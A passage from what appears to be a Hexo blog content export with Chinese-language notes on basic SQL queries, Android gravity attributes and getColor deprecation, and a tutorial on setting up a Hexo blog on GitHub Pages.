10G)<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> celebs</span><br><span class="line"><span class="keyword">MODIFY</span> <span class="keyword">COLUMN</span> twitter_handle <span class="built_in">INTEGER</span>;</span><br></pre></td></tr></table></figure></li><li>Oracle 10G and later<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> celebs</span><br><span class="line"><span class="keyword">MODIFY</span> twitter_handle <span class="built_in">INTEGER</span>;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="刪除資料">刪除資料</h3><p><code>DELETE FROM</code></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> celebs</span><br><span class="line"><span class="keyword">WHERE</span> twitter_handle <span class="keyword">IS</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><h2 id="進階查詢語法">進階查詢語法</h2><h3 id="SELECT"><code>SELECT</code></h3><p>查詢結果顯示 name, genre, year</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span>, genre, <span class="keyword">year</span></span><br><span class="line"><span class="keyword">FROM</span> movies;</span><br></pre></td></tr></table></figure><h3 id="AS"><code>AS</code></h3><p>可以改變查詢結果的欄位名稱，但不會改掉資料表裡的欄位</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> imdb_rating <span class="keyword">AS</span> <span class="string">'IMDb'</span> </span><br><span class="line"><span class="keyword">FROM</span> movies;</span><br></pre></td></tr></table></figure><h3 id="SELECT-DISTINCT"><code>SELECT DISTINCT</code></h3><p>去掉的重複的查詢結果</p><ul><li>去掉 year 重複的結果</li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> <span class="keyword">year</span></span><br><span class="line"><span class="keyword">FROM</span> movies;</span><br></pre></td></tr></table></figure><ul><li>去掉 year 和 name 都重複的結果</li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> <span class="keyword">year</span>, <span class="keyword">name</span></span><br><span class="line"><span class="keyword">FROM</span> movies;</span><br></pre></td></tr></table></figure><h3 id="WHERE"><code>WHERE</code></h3><p>篩選資料用的</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">year</span> &gt; <span class="number">2014</span>;</span><br></pre></td></tr></table></figure><table><thead><tr><th>運算子</th><th>作用</th></tr></thead><tbody><tr><td>=</td><td>等於</td></tr><tr><td>!=</td><td>不等於</td></tr><tr><td>&gt;</td><td>大於</td></tr><tr><td>&lt;</td><td>小於</td></tr><tr><td>&gt;=</td><td>大於等於</td></tr><tr><td>&lt;=</td><td>小於等於</td></tr></tbody></table><p>:::danger<br>「等於」要特別注意，只有一個等號<br>:::</p><h3 id="LIKE"><code>LIKE</code></h3><p>可以在 <code>WHERE</code> 子句中使用 <code>LIKE</code> 運算子來進行模糊搜尋</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">LIKE</span> <span class="string">'Se_en'</span>;</span><br></pre></td></tr></table></figure><p>:::info<br>_ 代表任意字元<br>:::</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * </span><br><span class="line"><span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">LIKE</span> <span class="string">'A%'</span>;</span><br></pre></td></tr></table></figure><ul><li><code>A%</code> 代表由 A 開頭</li><li><code>%A</code> 代表由 A 結尾</li><li><code>%man%</code> 代表所有含有 man 的字串</li></ul><h3 id="NULL"><code>NULL</code></h3><p><code>NULL</code> 不能拿來用運算子進行比較，因此出現 <code>IS NULL</code>、<code>IS NOT NULL</code> 來判斷是否是 <code>NULL</code>。</p><ul><li>顯示具有 imdb_rating 的資料</li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span></span><br><span class="line"><span class="keyword">FROM</span> movies </span><br><span class="line"><span class="keyword">WHERE</span> imdb_rating <span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><h3 id="BETWEEN"><code>BETWEEN</code></h3><p>可以在 <code>WHERE</code> 子句中使用 <code>BETWEEN</code> 運算子來篩選出特定範圍區間得值</p><p>篩選出 name 開頭為 ‘A’、‘B’、‘C’ 的結果</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">BETWEEN</span> <span class="string">'A'</span> <span class="keyword">AND</span> <span class="string">'D'</span>;</span><br></pre></td></tr></table></figure><p>篩選出 year 在 1990 ~ 1999 區間的結果</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">year</span> <span class="keyword">BETWEEN</span> <span class="number">1990</span> <span class="keyword">AND</span> <span class="number">1999</span>;</span><br></pre></td></tr></table></figure><p>:::warning<br><code>BETWEEN</code> 兩個字串，會不包含結尾<br><code>BETWEEN</code> 兩個數字，會包含結尾的數字<br>:::</p><h3 id="AND"><code>AND</code></h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * </span><br><span class="line"><span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">year</span> <span class="keyword">BETWEEN</span> <span class="number">1990</span> <span class="keyword">AND</span> <span class="number">1999</span></span><br><span class="line">   <span class="keyword">AND</span> genre = <span class="string">'romance'</span>;</span><br></pre></td></tr></table></figure><p><img data-src="https://i.imgur.com/G4B1Tcj.png" alt=""></p><h3 id="OR"><code>OR</code></h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">WHERE</span> genre = <span class="string">'romance'</span></span><br><span class="line">	<span class="keyword">OR</span> genre = <span class="string">'comedy'</span>;</span><br></pre></td></tr></table></figure><p><img data-src="https://i.imgur.com/qRNYsa9.png" alt=""></p><h3 id="ORDER-BY"><code>ORDER BY</code></h3><p>用來排序結果</p><p>:::warning<br>如果 <code>WHERE</code> 存在，<code>ORDER BY</code> 永遠跟在 <code>WHERE</code> 後面<br>:::</p><ul><li>DESC：從大道小排序</li><li>ASC：從小到大排序（預設）</li></ul><h3 id="LIMIT"><code>LIMIT</code></h3><p>用來限制查詢結果數量</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> movies</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> imdb_rating <span class="keyword">DESC</span></span><br><span class="line"><span class="keyword">LIMIT</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure><p>:::warning<br>永遠放在查訊語法最後面<br>:::</p><p>:::info<br>不是所有 RDBMS（關聯式資料庫管理系統） 都有<br>:::</p><h3 id="CASE"><code>CASE</code></h3><p>SQL 中的判斷式，可以用在顯示結果加上新欄位</p><p>:::info<br><code>CASE</code> 通常在 SELECT 語句中<br>:::</p><ul><li><code>WHEN</code> 後面接著條件式，如果條件式為真，會返回 <code>THEN</code> 後面的字串</li><li><code>ELSE</code> 會在前面條件式都不符合的時候，返回一個字串</li><li><code>CASE</code> 結尾一定要有一個 END</li><li>可以在 <code>END</code> 後面接 AS 來簡稱該條件的欄位名稱</li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">name</span>,</span><br><span class="line">    <span class="keyword">CASE</span></span><br><span class="line">        <span class="keyword">WHEN</span> genre = <span class="string">'romance'</span> <span class="keyword">THEN</span> <span class="string">'Chill'</span></span><br><span class="line">        <span class="keyword">WHEN</span> genre = <span class="string">'comedy'</span> <span class="keyword">THEN</span> <span class="string">'Chill'</span></span><br><span class="line">        <span class="keyword">ELSE</span> <span class="string">'Intense'</span></span><br><span class="line">    <span class="keyword">END</span> <span class="keyword">AS</span> <span class="string">'Mood'</span></span><br><span class="line"><span class="keyword">FROM</span> movies;</span><br></pre></td></tr></table></figure><h2 id="計算函式">計算函式</h2><h3 id="Count"><code>Count</code></h3><p>計算指定欄位非空資料的總數</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*) </span><br><span class="line"><span class="keyword">FROM</span> fake_apps</span><br><span class="line"><span class="keyword">WHERE</span> price = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h3 id="SUM"><code>SUM</code></h3><p>加總指定欄位的值</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">SUM</span>(downloads)</span><br><span class="line"><span class="keyword">FROM</span> fake_apps;</span><br></pre></td></tr></table></figure><h3 id="MAX-MIN"><code>MAX</code> / <code>MIN</code></h3><p>求指定欄位的最大或最小值</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">MIN</span>(downloads)</span><br><span class="line"><span class="keyword">FROM</span> fake_apps;</span><br></pre></td></tr></table></figure><h3 id="AVERAGE"><code>AVERAGE</code></h3><p>求指定欄位的平均值</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">AVG</span>(price)</span><br><span class="line"><span class="keyword">FROM</span> fake_apps;</span><br></pre></td></tr></table></figure><h3 id="ROUND"><code>ROUND</code></h3><p>將指定資料四捨五入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">ROUND</span>(<span class="keyword">AVG</span>(price), <span class="number">2</span>)</span><br><span class="line"><span class="keyword">FROM</span> fake_apps;</span><br></pre></td></tr></table></figure><h2 id="彙總函式">彙總函式</h2><h3 id="GROUP-BY"><code>GROUP BY</code></h3><p>用來搭配 SELECT 語句，將指定欄位中，相同資料的放在一組，以便計算函式以組為單位進行計算</p><p>:::info<br><code>GROUP BY</code> 會出現在 <code>WHERE</code> 之後，<code>ORDER BY</code> 和 <code>LIMIT</code> 之前<br>:::</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">category</span>, <span class="keyword">SUM</span>(downloads) </span><br><span class="line"><span class="keyword">FROM</span> fake_apps</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="keyword">category</span>;</span><br></pre></td></tr></table></figure><p><code>GROUP BY</code> 後面的參數可以接數字，從 1 開始，分別代表 SELECT 後面的第幾個值</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">category</span>, </span><br><span class="line">   price,</span><br><span class="line">   <span class="keyword">AVG</span>(downloads)</span><br><span class="line"><span class="keyword">FROM</span> fake_apps</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="number">1</span>, <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>以上面的例子來說，<code>GROUP BY</code> 後面的 1、2 分別指向 category 和 price</p><h3 id="HAVING"><code>HAVING</code></h3><p>與 <code>WHERE</code> 類似，不過他是針對 Group</p><p>:::info<br><code>HAVING</code> 會出現在 <code>GROUP BY</code> 之後，<code>ORDER BY</code> 和 <code>LIMIT</code> 之前<br>:::</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> price, </span><br><span class="line">   <span class="keyword">ROUND</span>(<span class="keyword">AVG</span>(downloads)),</span><br><span class="line">   <span class="keyword">COUNT</span>(*)</span><br><span class="line"><span class="keyword">FROM</span> fake_apps</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> price</span><br><span class="line"><span class="keyword">HAVING</span> <span class="keyword">COUNT</span>(*) &gt; <span class="number">10</span>;</span><br></pre></td></tr></table></figure><h2 id="表格連接">表格連接</h2><h3 id="JOIN"><code>JOIN</code></h3><p>使用方法：<code>JOIN</code> 表格名稱 <code>ON</code> 連接欄位規則</p><blockquote><p>連接後會自動補 <code>NULL</code></p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> orders</span><br><span class="line"><span class="keyword">JOIN</span> customers</span><br><span class="line">  <span class="keyword">ON</span> orders.customer_id = customers.customer_id;</span><br></pre></td></tr></table></figure><h3 id="INNER-JOIN"><code>INNER JOIN</code></h3><p>使用方法：<code>INNER JOIN</code> 表格名稱 <code>ON</code> 連接欄位規則</p><blockquote><p>會自動將不符合連接欄位規則的部分捨棄，如下圖</p></blockquote><p><img data-src="https://s3.amazonaws.com/codecademy-content/courses/learn-sql/multiple-tables/inner-join.gif" alt=""></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*)</span><br><span class="line"><span class="keyword">FROM</span> newspaper</span><br><span class="line"><span class="keyword">JOIN</span> <span class="keyword">online</span></span><br><span class="line"><span class="keyword">ON</span> newspaper.id = online.id;</span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
      <categories>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>筆記</tag>
      </tags>
  </entry>
  <entry>
    <title>android:gravity 和 android:layout_gravity 的差別</title>
    <url>/android-gravity%E5%92%8Candroid-layout-Gravity%E7%9A%84%E5%B7%AE%E5%88%A5/</url>
    <content><![CDATA[<!-- build time:Wed Apr 22 2020 17:07:35 GMT+0800 (台北標準時間) --><p>在 Android 介面設計中，常會用到 android:gravity 和 android:layout_gravity 兩種屬性，但卻容易被搞混，因此這邊做簡單的介紹，讓大家釐清差別。</p><a id="more"></a><p><code>android:gravity</code> 是作用在 view 裡的內容．比如一個 button 上面的 text。你可以設置該 text 在 view 裡是靠左、靠右等位置。</p><p><code>android:layout_gravity</code> 是用來設置該 view 相對於父 view 的位置。比如一個 button 在 LinearLayout 裡，你想讓該 button 在 LinearLayout 裡是靠左、靠右等位置。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>getColor(int id) deprecated</title>
    <url>/getcolor-deprecated/</url>
    <content><![CDATA[<!-- build time:Wed Apr 22 2020 17:07:35 GMT+0800 (台北標準時間) --><p>從 Android 6 開始，一個新的 getColor() 方法出現，舊的 Resource.getColor(int id) 則被廢棄。</p><a id="more"></a><p>新方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">context.getColor(id);</span><br></pre></td></tr></table></figure><p>如果要兼容 Android 6 以下的版本，建議使用 Support Library v4 的方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ContextCompat.getColor(context, R.color.your_color);</span><br></pre></td></tr></table></figure><p>此方法來自官方 JavaDoc 的描述：</p><pre><code>Returns a color associated with a particular resource ID

Starting in M, the returned color will be styled for the specified Context's theme.
</code></pre><p>這是 ContextCompat.getColor() 的程式碼：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">getColor</span><span class="params">(Context context, @ColorRes <span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="number">23</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> context.getColor(id);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> context.getResources().getColor(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果不想導入 Support Library v4，可以直接參考上面的寫法。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>deprecated</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo+GitHub，新手也可以快速建立部落格</title>
    <url>/hexo-tutorial/</url>
    <content><![CDATA[<!-- build time:Wed Apr 22 2020 17:07:35 GMT+0800 (台北標準時間) --><p>之前使用過 Wordpress 一段時間，但發現了 Hexo 更方便，所以這邊來紀錄一下使用過程。</p><a id="more"></a><h2 id="Hexo-優點">Hexo 優點</h2><ol><li>因為建立於本地端，所以可以更方便離線進行編輯</li><li>可以不需要一台伺服器</li><li>文章編輯使用 Markdown 語法，更方便、通用、容易上手</li><li>部署於 GitHub 上，完全零成本</li><li>中文兼容性高</li><li>可快速搭建優質的部落格</li></ol><h2 id="開始之前">開始之前</h2><p>建議先了解，cmd 或是 bash 指令<br>之後所有指令以 ‘$’ 開頭，皆為 bash 指令<br>​<br>有任何問題，都歡迎留言詢問唷～</p><h2 id="建制步驟">建制步驟</h2><h3 id="安裝-Node-js">安裝 Node.js</h3><p>去 <span class="exturl" data-url="aHR0cHM6Ly9ub2RlanMub3JnL2VuLw==">Node.js<i class="fa fa-external-link-alt"></i></span> 官網下載安裝</p><h3 id="安裝-Hexo-Git">安裝 Hexo Git</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install hexo-deployer-git --save</span></span><br></pre></td></tr></table></figure><h3 id="安裝-Hexo">安裝 Hexo</h3><p>使用 npm 來安裝 hexo (須先安裝 Node.js)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> npm install hexo-cli -g</span></span><br></pre></td></tr></table></figure><p>安裝成功後，輸入以下指令可查看版本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo version</span></span><br></pre></td></tr></table></figure><p>接下來即可初始化我們的部落格了</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo init blog       <span class="comment"># 初始化 blog</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> blog              <span class="comment"># 移動到剛創建的 blog 資料夾裡</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> npm install		<span class="comment"># 安裝相關套件</span></span></span><br></pre></td></tr></table></figure><h3 id="將-Hexo-配置到-GitHub">將 Hexo 配置到 GitHub</h3><p>去 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLw==">GitHub<i class="fa fa-external-link-alt"></i></span> 官網登入。<br>新增一個倉庫(Repositories)</p><p><img data-src="https://i.imgur.com/hC3eCNY.png" alt=""></p><p>倉庫名稱為 <span class="exturl" data-url="aHR0cDovL3lvdXJuYW1lLmdpdGh1Yi5pbw==">yourname.github.io<i class="fa fa-external-link-alt"></i></span></p><blockquote><p>上面的 yourname 請替換成你 GitHub 的帳號名稱</p></blockquote><p><img data-src="https://i.imgur.com/72ZXHCJ.png" alt=""></p><p>看到這頁代表即可退出</p><p><img data-src="https://i.imgur.com/tLiMyDf.png" alt=""></p><p>再來到 blog 資料夾下找一個 _config.yml 的檔案，這是 Hexo 的全域配置文件<br><img data-src="https://i.imgur.com/OjTrXMX.png" alt=""></p><p>開啟之後，拉到檔案最底部，可以看到</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type:</span><br></pre></td></tr></table></figure><p>將以下資訊對應輸入</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: http://github.com/yourname/yourname.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><blockquote><p>設定中的 “:” 後一定要有一個空格<br>將上面的 yourname 改成妳的 GitHub 帳號名稱</p></blockquote><p>產生靜態文件後，部署上 GitHub</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo d -g</span></span><br></pre></td></tr></table></figure><p>再來就可以上 <span class="exturl" data-url="aHR0cHM6Ly95b3VybmFtZS5naXRodWIuaW8v">https://yourname.github.io/<i class="fa fa-external-link-alt"></i></span> 查看是否部署成功<br>成功之後，就可以開始做一些優化和寫文章啦。</p><blockquote><p>將上面的 yourname 替換成你 GitHub 的帳號名稱</p></blockquote><h2 id="Hexo-配置檔介紹">Hexo 配置檔介紹</h2><p>_config.yml 是 hexo 的預設設定黨，其設定是用 yaml 格式編寫。</p><p><strong>yaml 檔裡，&quot;:&quot;後一定要有一個空格</strong><br>下面是 hexo 的預設配置，可以自修改。</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">/標題(會顯示在網頁標題與頁首)/</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">/子標題(顯示在頁首)/</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">/內容描述(給搜尋引擎看的)/</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">/作者(顯示在頁尾)/</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">/網站預設語言(台灣:zh-tw)/</span></span><br><span class="line"><span class="attr">timezone:</span> <span class="string">/時區(預設使用你電腦的時區)/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">/網站的網域位址/</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/網站根目錄/</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">/文章目錄(預設使用</span> <span class="string">YYYY\MM\DD\文章名稱)/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">/網站的佈景主題/</span></span><br><span class="line">       <span class="string">(可以到"https://hexo.io/themes/"下載喜歡的佈景放置到</span> <span class="string">theme</span> <span class="string">目錄裡)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">/發佈型態/</span> <span class="string">例如(git、heroku、rsync、openshift、ftpsync)</span></span><br><span class="line">    <span class="attr">repository:</span> <span class="string">/部署位置/</span> <span class="string">例如(git@github.com:帳號/REPO名.git)</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">/分支/</span> <span class="string">例如(master、gh-pages)</span></span><br><span class="line">    <span class="attr">message:</span> <span class="string">/部署訊息/</span></span><br></pre></td></tr></table></figure><h2 id="使用-Next-主題">使用 Next 主題</h2><p>本站使用主題為 Next.Pisces 主題。<br>如何使用，可以參考 <span class="exturl" data-url="aHR0cDovL3RoZW1lLW5leHQuaWlzc25hbi5jb20vZ2V0dGluZy1zdGFydGVkLmh0bWw=">官方教學文件<i class="fa fa-external-link-alt"></i></span>，上面寫的很詳細，而且是中文的教學！</p><h2 id="發布文章">發布文章</h2><p>創建文章</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo new [postName]</span></span><br></pre></td></tr></table></figure><p><em>備註：將 [postName] 換成你的文章名稱 (以英文尤佳)</em></p><p>前往 source / _post 資料夾中，打開 [postName].md 文件，在最下面新增 <span class="exturl" data-url="aHR0cHM6Ly93YXN0ZW1vYmlsZS5naXRib29rcy5pby9naXRib29rLWNoaW5lc2UvY29udGVudC9mb3JtYXQvbWFya2Rvd24uaHRtbA==">Markdown<i class="fa fa-external-link-alt"></i></span> 語法的內容。</p><p>修改完後，執行以下指令，就可以將新的變更發佈到部落格上囉！</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo d -g    <span class="comment"># d = 部署, g = 生成</span></span></span><br></pre></td></tr></table></figure><p>等一段時間，就可以看到你剛剛打的文章囉！</p><p>如果你要先在本地端看看效果，也可以改成以下指令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo server</span></span><br></pre></td></tr></table></figure><p><strong>不熟悉 Markdown 的人</strong>，可以去看看這篇 <span class="exturl" data-url="aHR0cHM6Ly93YXN0ZW1vYmlsZS5naXRib29rcy5pby9naXRib29rLWNoaW5lc2UvY29udGVudC9mb3JtYXQvbWFya2Rvd24uaHRtbA==">Markdown 語法教學<i class="fa fa-external-link-alt"></i></span></p><p>如果想<strong>嘗試編寫 Markdown</strong>，或是想<strong>找一個好用的Markdown 編輯器</strong>，可以嘗試使用 <span class="exturl" data-url="aHR0cHM6Ly9oYWNrbWQuaW8vcmVjZW50">HackMD<i class="fa fa-external-link-alt"></i></span>。</p><h2 id="刪除文章">刪除文章</h2><p>首先進入到 source / _post 資料夾中，找到 <span class="exturl" data-url="aHR0cDovL2hlbGxvd29ybGQubWQ=">helloworld.md<i class="fa fa-external-link-alt"></i></span> 文件，在本地直接執行刪除。<br><img data-src="https://i.imgur.com/QSV6q2a.png" alt=""></p><p>執行以下指令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> hexo clean    <span class="comment"># 清除快取檔案和已產生的靜態檔案。</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> hexo d -g     <span class="comment"># d = deploy, g = generate</span></span></span><br></pre></td></tr></table></figure><p>等一段時間，就會發現那篇文章已經消失囉！</p><h2 id="使用第三方擴充服務">使用第三方擴充服務</h2><p>本站有使用以下第三方服務，有興趣可以去看看。</p><ol><li><span class="exturl" data-url="aHR0cDovL3RoZW1lLW5leHQuaWlzc25hbi5jb20vdGhpcmQtcGFydHktc2VydmljZXMuaHRtbCNkaXNxdXM=">DISQUS<i class="fa fa-external-link-alt"></i></span>：評論系統</li><li><span class="exturl" data-url="aHR0cDovL3RoZW1lLW5leHQuaWlzc25hbi5jb20vdGhpcmQtcGFydHktc2VydmljZXMuaHRtbCNsb2NhbC1zZWFyY2g=">Local Search<i class="fa fa-external-link-alt"></i></span>：搜尋系統</li><li><span class="exturl" data-url="aHR0cHM6Ly9za3lsYWtlLnR3LzIwMTcvMDkvMjkvaGV4by1idWlsZHVwLyN3ZW4temhhbmctemhhaS15YW8teGlhbi1zaGktc2hpLXlvbmc=">文章摘要顯示使用<i class="fa fa-external-link-alt"></i></span>：優化主頁文章摘要</li><li><span class="exturl" data-url="aHR0cDovL3RoZW1lLW5leHQuaWlzc25hbi5jb20vdGhpcmQtcGFydHktc2VydmljZXMuaHRtbCNhbmFseXRpY3MtYnVzdWFuemk=">不蒜子统计<i class="fa fa-external-link-alt"></i></span>：瀏覽量統計</li></ol><h2 id="客製化設定">客製化設定</h2><p>本站參考了以下幾篇文章，修改了一些顯示效果，有興趣可以看看。</p><ol><li><span class="exturl" data-url="aHR0cHM6Ly9za3lsYWtlLnR3LzIwMTcvMDkvMjkvaGV4by1idWlsZHVwLyNyYW5nLW5leC10LXpodS10aS1kZS1tYXJrZG93bi1oLTItemktZG9uZy1jaGFuLXNoZW5nLWRpLXhpYW4=">讓NexT主題的Markdown H2自動產生底線<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9za3lsYWtlLnR3LzIwMTcvMDkvMjkvaGV4by1idWlsZHVwLyNyYW5nLW5leC10LXpodS10aS1kZS1saXN0LWJ1LXpoaS15b3UteXVhbi14aW5n">讓NexT主題的List不只有圓形<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3NoZW56ZWt1bi5jbi9oZXhvJUU3JTlBJTg0bmV4dCVFNCVCOCVCQiVFOSVBMiU5OCVFNCVCOCVBQSVFNiU4MCVBNyVFNSU4QyU5NiVFOSU4NSU4RCVFNyVCRCVBRSVFNiU5NSU5OSVFNyVBOCU4Qi5odG1sIzYtJUU0JUJGJUFFJUU2JTk0JUI5JUU2JTk2JTg3JUU3JUFCJUEwJUU1JUJBJTk1JUU5JTgzJUE4JUU3JTlBJTg0JUU5JTgyJUEzJUU0JUI4JUFBJUU1JUI4JUE2LSVFNSU4RiVCNyVFNyU5QSU4NCVFNiVBMCU4NyVFNyVBRCVCRQ==">修改文章底部的那个带#号的标签<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9yZXVpeGl5LmdpdGh1Yi5pby90ZWNobm9sb2d5L2NvbXB1dGVyL2NvbXB1dGVyLWFpZGVkLWFydC8yMDE3LzA2LzA5L2hleG8tbmV4dC1vcHRpbWl6YXRpb24uaHRtbCMlRTUlOEElQTglRTYlODAlODElRTglODMlOEMlRTYlOTklQUY=">動態背景<i class="fa fa-external-link-alt"></i></span></li></ol><h2 id="登錄搜尋引擎">登錄搜尋引擎</h2><p>如果只支援 Google 可以參考這篇 <span class="exturl" data-url="aHR0cDovL3RoZW1lLW5leHQuaWlzc25hbi5jb20vdGhpcmQtcGFydHktc2VydmljZXMuaHRtbCNnb29nbGUtd2VibWFzdGVyLXRvb2xz">Next+Google Webmaster tools<i class="fa fa-external-link-alt"></i></span>，<br>如果也想支援百度，可以參考這篇 <span class="exturl" 